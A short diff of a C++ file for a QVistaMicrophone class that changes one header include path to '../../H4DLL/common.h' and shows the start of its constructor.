@@ -3,7 +3,8 @@
 
 #undef _WIN32_WINNT
 #define _WIN32_WINNT 0x0600
-#include "..\common.h"
+#include "../../H4DLL/common.h"
+
 #include "QVistaMicrophone.h"
 
 QVistaMicrophone::QVistaMicrophone(BOOL bCalibration, UINT uThreshold, INT iSilence) : 
